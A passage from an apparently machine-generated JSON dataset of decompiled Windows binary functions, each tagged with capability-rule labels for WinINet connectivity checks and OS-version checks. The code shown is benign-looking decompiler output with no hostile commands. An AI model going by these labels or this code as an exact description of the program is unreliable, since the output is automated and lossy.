        "decompiled_code": "\nvoid fcn.0046f2fc(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack4136;\n    uint uStack4132;\n    uchar *puStack4128;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4128 = &stack0xfffffffc;\n    piVar1 = 0x2;\n    do {\n        piVar2 = piVar1;\n        piVar1 = piVar2 + -1;\n    } while (piVar2 + -1 != NULL);\n    uStack4132 = 0x46f407;\n    uStack4136 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefd8;\n    iVar3 = (**(*piVar2 + 0x70))();\n    if (iVar3 < 0x2001) {\n        uVar4 = (**(*piVar2 + 0x88))();\n        fcn.00404a88(uVar4);\n        fcn.004092f0();\n        if (*(piVar2 + 0xe1) != '\\0') {\n            (**(*piVar2[0xd] + 0x254))(1);\n        }\n        fcn.0046e578();\n    }\n    else {\n        fcn.00404a88();\n        fcn.0040928c();\n        fcn.00404c14();\n        fcn.00404a88();\n        fcn.0040928c();\n        fcn.004092f0();\n        if (*(piVar2 + 0xe1) != '\\0') {\n            (**(*piVar2[0xd] + 0x254))(1);\n        }\n        fcn.0046e578();\n    }\n    *in_FS_OFFSET = uStack4136;\n    puStack4128 = 0x46f40e;\n    uStack4132 = 0x46f406;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 455
    },
    "0046f9a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0046fa2b)\n\nvoid __fastcall fcn.0046f9a4(char param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffecc;\n    uint uStack296;\n    uint uStack292;\n    uchar *puStack288;\n    uint var_10ch;\n    uint var_108h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack288 = &stack0xfffffffc;\n    uStack292 = 0x46fa7a;\n    uStack296 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack296;\n    cVar1 = fcn.0046fa88();\n    if (cVar1 == '\\0') {\n        fcn.004045c8();\n    }\n    else {\n        if ((param_1 == '\\0') && (*(in_EAX + 0xe4) != 0)) {\n            fcn.00404660();\n        }\n        else {\n            fcn.00404660();\n        }\n        fcn.00403244();\n        fcn.0040482c();\n    }\n    *in_FS_OFFSET = in_stack_fffffecc;\n    fcn.004045c8(0x81);\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 304
    },
    "0046fb44": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0046fb44(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x46fbec;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if (param_2 == 0) {\n        puStack48 = &stack0xfffffffc;\n        (**(*in_EAX + 0xd0))();\n    }\n    else {\n        fcn.00403250();\n        if (var_4h != 0) {\n            arg_8h = 0;\n            var_10h._0_1_ = 0xb;\n            var_14h = param_2;\n            fcn.0046dd78();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            fcn.0040675c(&fcn.0046fb44::var_14h);\n            fcn.0046bc4c(arg_8h);\n        }\n        (**(*in_EAX + 0xa8))();\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x46fbf3;\n    uStack52 = 0x46fbeb;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 398
    },
    "0046fe94": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0046ff1e)\n\nvoid __fastcall fcn.0046fe94(char param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffec8;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_110h;\n    uint var_10ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    uStack296 = 0x46ff6d;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    cVar1 = fcn.0046ff7c();\n    if (cVar1 == '\\0') {\n        fcn.004045c8();\n    }\n    else {\n        if ((param_1 == '\\0') && (*(in_EAX + 0xe4) != 0)) {\n            fcn.00404660();\n        }\n        else {\n            fcn.00404660();\n        }\n        fcn.004055fc(var_8h, var_4h);\n        in_stack_fffffec8 = 0x46ff1c;\n        fcn.0040482c();\n    }\n    *in_FS_OFFSET = in_stack_fffffec8;\n    fcn.004045c8(0x74);\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 335
    },
    "0046ffb4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046ffb4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    bool bVar1;\n    \n    if ((*(in_EAX + 0xec) == 0) && (*(in_EAX + 0xe8) == 0)) {\n        bVar1 = *(in_EAX + 0xf4) == 0;\n        if (bVar1) {\n            bVar1 = *(in_EAX + 0xf0) == 0;\n        }\n        if (bVar1) goto code_r0x00470003;\n    }\n    fcn.0046fd38(*(in_EAX + 0xf0), *(in_EAX + 0xf4), *(in_EAX + 0xe8), *(in_EAX + 0xec), arg_8h, arg_ch);\ncode_r0x00470003:\n    fcn.0046e578();\n    return;\n}\n",
        "token_count": 211
    },
    "00470014": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00470014(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb4;\n    uint arg_8h;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x4700c0;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack64;\n    if (param_2 == 0) {\n        puStack56 = &stack0xfffffffc;\n        (**(*in_EAX + 0xd0))();\n    }\n    else {\n        _var_10h = fcn.00405618();\n        if (var_4h != 0) {\n            arg_8h = 0;\n            var_1ch._0_1_ = 0xb;\n            var_20h = param_2;\n            fcn.0046dd78();\n            var_18h = 0;\n            var_14h._0_1_ = 0xb;\n            fcn.0040675c(&var_20h);\n            fcn.0046bc4c(arg_8h);\n        }\n        var_ch = _var_10h >> 0x20;\n        in_stack_ffffffb4 = var_10h;\n        fcn.0046ffb4(var_10h, var_ch);\n    }\n    *in_FS_OFFSET = in_stack_ffffffb4;\n    fcn.004045ec(0x4700c7);\n    return;\n}\n",
        "token_count": 436
    },
    "004702d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004702d8(char param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    float10 fVar2;\n    uint *arg_8h;\n    uint in_stack_ffffffc0;\n    uint uVar3;\n    uchar uVar4;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_14h = 0;\n    var_4h = 0;\n    uStack48 = 0x4703e1;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    cVar1 = fcn.0046dc98();\n    if (cVar1 == '\\0') {\n        fcn.004045c8();\n    }\n    else {\n        if ((param_1 == '\\0') && (*(in_EAX + 0xe4) != 0)) {\n            fcn.00404660();\n        }\n        else {\n            fcn.00404660();\n        }\n        if (var_4h == 0) {\n            if (*(in_EAX + 0xe8) == '\\0') {\n                var_8h = 0;\n            }\n            else {\n                var_8h = **0x484488;\n            }\n            fVar2 = _var_10h;\n            in_stack_ffffffc0 = SUB104(fVar2, 0);\n            uVar3 = fVar2 >> 0x20;\n            uVar4 = fVar2 >> 0x40;\n            arg_8h = &var_14h;\n            fcn.0040a420(arg_8h, in_stack_ffffffc0);\n            fcn.0040461c(arg_8h, in_stack_ffffffc0, uVar3, uVar4);\n        }\n        else {\n            fVar2 = _var_10h;\n            in_stack_ffffffc0 = SUB104(fVar2, 0);\n            uVar3 = fVar2 >> 0x20;\n            uVar4 = fVar2 >> 0x40;\n            fcn.0040a490(in_stack_ffffffc0);\n            fcn.0040461c(in_stack_ffffffc0, uVar3, uVar4);\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffc0;\n    fcn.004045ec(0xe8);\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 607
    },
    "004703f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004703f0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    float10 fVar1;\n    float10 fVar2;\n    uint in_stack_00000008;\n    ushort in_stack_ffffffde;\n    ushort in_stack_ffffffea;\n    \n    if ((*(in_EAX + 0xe9) != '\\0') &&\n       ((CONCAT44(in_stack_00000008, arg_8h) < *(in_EAX + 0xf0) ||\n        (*(in_EAX + 0xf8) < CONCAT44(in_stack_00000008, arg_8h))))) {\n        fVar1 = *(in_EAX + 0xf0);\n        fVar2 = *(in_EAX + 0xf8);\n        fcn.0046f718(SUB104(fVar2, 0), fVar2 >> 0x20, CONCAT22(in_stack_ffffffde, fVar2 >> 0x40), SUB104(fVar1, 0), \n                     fVar1 >> 0x20, CONCAT22(in_stack_ffffffea, fVar1 >> 0x40), \n                     SUB104(CONCAT44(in_stack_00000008, arg_8h), 0));\n    }\n    fcn.0046e578();\n    return;\n}\n",
        "token_count": 289
    },
    "00470ab4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470ab4(char param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffcc;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x470b5f;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    cVar1 = fcn.00470b70();\n    if (cVar1 == '\\0') {\n        fcn.004045c8();\n        var_10h = in_stack_ffffffcc;\n    }\n    else {\n        if ((param_1 == '\\0') || (*(in_EAX + 0xe0) == 0)) {\n            if (*(in_EAX + 0x40) == '\\t') {\n                fcn.00404660();\n            }\n            else if (*(in_EAX + 0x40) == '\\n') {\n                fcn.00404660();\n            }\n        }\n        else {\n            fcn.00404660();\n        }\n        fcn.0040b69c(var_10h, var_ch);\n    }\n    *in_FS_OFFSET = var_10h;\n    uStack44 = 0x470b66;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 331
    },
    "00470d9c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470d9c(char param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x470e33;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    cVar1 = fcn.00470e44();\n    if (cVar1 == '\\0') {\n        fcn.004045c8();\n    }\n    else {\n        if ((param_1 == '\\0') || (*(in_EAX + 0xe0) == 0)) {\n            fcn.004045c8();\n        }\n        else {\n            fcn.00404660();\n        }\n        fcn.00460538();\n        fcn.0040461c();\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x470e3a;\n    uStack48 = 0x470e2a;\n    fcn.004045c8();\n    uStack48 = 0x470e32;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 302
    },
    "0047168c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00471749)\n\nvoid __fastcall fcn.0047168c(char param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb8;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack56 = &stack0xfffffffc;\n    uStack48 = 0x4717bf;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x471779;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    cVar1 = fcn.0046dc98();\n    if (cVar1 == '\\0') {\n        fcn.004045c8();\n        var_10h = in_stack_ffffffb8;\n    }\n    else {\n        if ((param_1 == '\\0') && (*(in_EAX + 0xe4) != 0)) {\n            fcn.00404660();\n        }\n        else {\n            fcn.00404660();\n        }\n        fcn.0040a458(var_10h);\n        fcn.0040461c(var_10h, var_ch);\n    }\n    *in_FS_OFFSET = var_10h;\n    *in_FS_OFFSET = uStack60;\n    uStack52 = 0x4717c6;\n    puStack56 = 0x4717b6;\n    fcn.004045ec();\n    puStack56 = 0x4717be;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 442
    },
    "00471800": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00471800(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    float10 fVar1;\n    float10 fVar2;\n    uint in_stack_00000008;\n    ushort in_stack_ffffffde;\n    ushort in_stack_ffffffea;\n    \n    if ((*(in_EAX + 0xe9) != '\\0') &&\n       ((CONCAT44(in_stack_00000008, arg_8h) < *(in_EAX + 0xf0) ||\n        (*(in_EAX + 0xf8) < CONCAT44(in_stack_00000008, arg_8h))))) {\n        fVar1 = *(in_EAX + 0xf0) / *0x471880;\n        fVar2 = *(in_EAX + 0xf8) / *0x471880;\n        fcn.0046f718(SUB104(fVar2, 0), fVar2 >> 0x20, CONCAT22(in_stack_ffffffde, fVar2 >> 0x40), SUB104(fVar1, 0), \n                     fVar1 >> 0x20, CONCAT22(in_stack_ffffffea, fVar1 >> 0x40), \n                     SUB104(CONCAT44(in_stack_00000008, arg_8h) / *0x471880, 0));\n    }\n    fcn.0046e578();\n    return;\n}\n",
        "token_count": 309
    },
    "00471cbc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00471cbc(char param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t arg_ch;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ah;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    puStack84 = &stack0xfffffffc;\n    var_30h = 0;\n    var_8h = 0;\n    uStack76 = 0x471def;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    uStack88 = 0x471da9;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    var_4h = param_2;\n    cVar1 = fcn.0046dc98();\n    if (cVar1 == '\\0') {\n        fcn.004045c8();\n    }\n    else {\n        if ((param_1 == '\\0') && (*(in_EAX + 0xe4) != 0)) {\n            fcn.00404660();\n        }\n        else {\n            fcn.00404660();\n        }\n        if (var_8h == 0) {\n            if (*(in_EAX + 0xe8) == '\\0') {\n                arg_ch = 0;\n            }\n            else {\n                arg_ch = **0x484488;\n            }\n            fcn.00464af4(&fcn.00471cbc::var_30h, arg_ch);\n            fcn.0040461c();\n        }\n        else {\n            fcn.00465664();\n            fcn.0040461c();\n        }\n    }\n    *in_FS_OFFSET = uStack92;\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x471df6;\n    uStack76 = 0x471de6;\n    fcn.004045ec();\n    uStack76 = 0x471dee;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 518
    },
    "00471ed4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00471ed4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    char cVar3;\n    char cVar4;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint uStackY44;\n    uint *puStackY40;\n    uint *var_20h;\n    uint arg_8h;\n    uint var_10h;\n    \n    iVar1 = 7;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    var_20h = 0x471f01;\n    fcn.004614fc();\n    cVar4 = '\\0';\n    cVar3 = *(in_EAX + 0xe9) < '\\0';\n    uVar2 = *(in_EAX + 0xe9) == '\\0';\n    if (!uVar2) {\n        var_20h = &fcn.00471ed4::var_20h;\n        puStackY40 = 0x471f1c;\n        (**(*in_EAX + 0x88))();\n        puStackY40 = 0x471f30;\n        fcn.00461448(var_20h);\n        puStackY40 = &fcn.00471ed4::var_30h;\n        uStackY44 = 0x471f3e;\n        (**(*in_EAX + 0x88))();\n        var_20h = 0x471f52;\n        fcn.00461448(arg_8h);\n        var_20h = 0x471f5d;\n        fcn.0041780c();\n        if (cVar4 == cVar3) {\n            var_20h = 0x471f6a;\n            fcn.0041781c();\n            if (uVar2 || cVar4 != cVar3) goto code_r0x00471f93;\n        }\n        var_20h = 0x471f77;\n        fcn.00413a6c();\n        puStackY40 = 0x471f86;\n        fcn.00413a6c();\n        puStackY40 = 0x471f93;\n        fcn.00471e08(var_34h);\n        arg_8h = var_34h;\n    }\ncode_r0x00471f93:\n    var_20h = 0x471f9e;\n    fcn.0046e578();\n    *in_FS_OFFSET = arg_8h;\n    fcn.004045ec();\n    fcn.00405080();\n    return;\n}\n",
        "token_count": 648
    },
    "00471fdc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00471fdc(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar1;\n    char cVar2;\n    char cVar3;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_54h;\n    uint var_42h;\n    uint *arg_8h_00;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    int32_t iStack16;\n    uint uStack8;\n    \n    puStack24 = &stack0xfffffffc;\n    iStack16 = 0xf;\n    do {\n        uStack8 = 0;\n        iStack16 = iStack16 + -1;\n    } while (iStack16 != 0);\n    uStack28 = 0x47211f;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    var_20h = arg_ch;\n    fcn.00464214(arg_8h, arg_ch);\n    cVar3 = '\\0';\n    cVar2 = *(in_EAX + 0xe9) < '\\0';\n    uVar1 = *(in_EAX + 0xe9) == '\\0';\n    if (!uVar1) {\n        arg_8h_00 = &fcn.00471fdc::var_10h;\n        (**(*in_EAX + 0x88))();\n        fcn.00461448(arg_8h_00);\n        (**(*in_EAX + 0x88))(&fcn.00471fdc::var_20h);\n        fcn.00461448(arg_8h);\n        fcn.00414af0();\n        fcn.0041780c();\n        if (cVar3 == cVar2) {\n            fcn.00414af0();\n            fcn.0041781c();\n            if (uVar1 || cVar3 != cVar2) goto code_r0x004720ca;\n        }\n        fcn.00413a6c();\n        fcn.00413a6c();\n        fcn.00414af0(var_6ch);\n        fcn.00471e08(var_68h);\n        arg_8h = var_68h;\n    }\ncode_r0x004720ca:\n    fcn.0046e578();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x472126;\n    var_20h = 0x4720eb;\n    fcn.004104d4();\n    var_20h = 0x4720f8;\n    fcn.004045ec();\n    var_20h = 0x47210b;\n    fcn.00405080();\n    var_20h = 0x47211e;\n    fcn.00405080();\n    return;\n}\n",
        "token_count": 699
    },
    "004722e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004722e0(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0xec) == 0) && (*(in_EAX + 0xf0) == 0)) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    *(in_EAX + 0xe9) = uVar1;\n    return;\n}\n",
        "token_count": 102
    },
    "004726b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004726b4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    ulong uVar4;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack20 = 0x4726c4;\n    cVar1 = fcn.0047272c();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x4726d7;\n        puVar2 = (**(**(in_EAX + 0x34) + 0x214))();\n        uStack24 = 0x472713;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &fcn.004726b4::var_1h + 1;\n        uVar4 = (***puVar2)();\n        var_1h._0_1_ = uVar4 >> 0x20 == 0 && uVar4 == 0;\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x472724;\n        uStack24 = 0x472712;\n        uVar3 = fcn.00403820();\n        return uVar3;\n    }\n    puStack20 = 0x472721;\n    uVar3 = fcn.0046decc();\n    return uVar3;\n}\n",
        "token_count": 365
    },
    "0047272c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0047272c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0xe4) != '\\0') && (*(*(in_EAX + 0x34) + 0x54) == *(in_EAX + 0xe0))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 81
    },
    "00472848": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472848(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc4;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack32 = 0x47285d;\n    fcn.0040630c();\n    uStack36 = 0x472936;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x47287a;\n    puStack32 = &stack0xfffffffc;\n    piVar1 = (**(**(in_EAX + 0x34) + 0x214))();\n    uStack48 = 0x472919;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    if (((*(in_EAX + 0xe5) == '\\0') || (*(in_EAX + 0x40) != '\\x11')) && (*(in_EAX + 0x40) != '\\x15')) {\n        puStack44 = &stack0xfffffffc;\n        (**(*param_2 + 0x10))();\n    }\n    else {\n        puStack44 = &stack0xfffffffc;\n        (**(*piVar1 + 0x10))();\n        (**(*param_2 + 0x10))();\n        fcn.0041e990();\n        in_stack_ffffffc4 = 0;\n        fcn.0041e9b0(0, 0);\n        (**(*piVar1 + 0x10))();\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    uStack52 = 0x472920;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 453
    },
    "004729f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
